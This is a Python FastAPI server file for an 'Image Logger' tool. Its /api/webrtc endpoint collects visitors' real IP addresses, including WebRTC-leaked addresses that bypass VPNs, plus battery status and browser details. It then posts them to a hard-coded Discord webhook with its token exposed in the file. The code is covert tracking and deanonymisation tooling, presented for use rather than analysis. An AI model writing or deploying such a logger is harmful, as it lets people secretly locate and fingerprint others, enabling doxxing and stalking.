from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import Response
import requests

app = FastAPI()

config = {
    "webhook": "https://discord.com/api/webhooks/1533168835316682854/TKTyWeqHd99G3wbXyYZeCd2n6-JocDtoNKSju2cuoOYNnUtCa0iXwTAyy_CVLHf9EnAF",
    "username": "Image Logger",
    "color": 0x00FFFF,
}


def parse_ua(useragent: str) -> tuple[str, str]:
    ua = useragent.lower()
    if "windows" in ua:
        os_name = "Windows"
    elif "android" in ua:
        os_name = "Android"
    elif "iphone" in ua or "ipad" in ua:
        os_name = "iOS"
    elif "mac" in ua:
        os_name = "macOS"
    elif "linux" in ua:
        os_name = "Linux"
    else:
        os_name = "Unknown"

    if "edg/" in ua:
        browser = "Edge"
    elif "opr/" in ua or "opera" in ua:
        browser = "Opera"
    elif "chrome/" in ua and "chromium" not in ua:
        browser = "Chrome"
    elif "firefox/" in ua:
        browser = "Firefox"
    elif "safari/" in ua and "chrome" not in ua:
        browser = "Safari"
    elif "wget" in ua or "curl" in ua:
        browser = "CLI"
    else:
        browser = "Unknown"

    return os_name, browser


def send_webrtc_report(ip: str, useragent: str, webrtc_ips: list[str], battery: dict = None):
    unique = list(dict.fromkeys(webrtc_ips))
    formatted = "\n".join(f"> `{addr}`" for addr in unique) if unique else "> `Nenhum`"
    os_name, browser = parse_ua(useragent)

    battery_section = ""
    if battery:
        level = battery.get("level", "?")
        charging = battery.get("charging", False)
        c_time = battery.get("chargingTime")
        d_time = battery.get("dischargingTime")

        charging_str = "Sim" if charging else "Não"

        if charging and c_time is not None:
            time_str = f"{int(c_time // 60)}min pra carregar"
        elif not charging and d_time is not None:
            time_str = f"{int(d_time // 60)}min restantes"
        else:
            time_str = "Indisponível"

        battery_section = f"""
**Battery Info:**
> **Nível:** `{level}%`
> **Carregando:** `{charging_str}`
> **Tempo:** `{time_str}`"""

    description = f"""**WebRTC + Battery Coletados**

**IP Header:** `{ip}`

**WebRTC Leaked IPs:**
{formatted}
{battery_section}

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```"""

    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "embeds": [{
                "title": "Image Logger - WebRTC + Battery",
                "color": config["color"],
                "description": description
            }]
        }, timeout=8)
    except:
        pass


@app.post("/api/webrtc")
async def webrtc_collect(request: Request, background_tasks: BackgroundTasks):
    try:
        body = await request.json()
    except:
        return Response(status_code=204)

    ip = request.headers.get("x-forwarded-for") or (
        request.client.host if request.client else "Unknown"
    )
    if "," in str(ip):
        ip = ip.split(",")[0].strip()

    useragent = request.headers.get("user-agent", "")
    webrtc_ips: list[str] = body.get("ips", [])
    battery: dict | None = body.get("battery", None)

    if webrtc_ips or battery:
        background_tasks.add_task(send_webrtc_report, ip, useragent, webrtc_ips, battery)

    return Response(status_code=204)
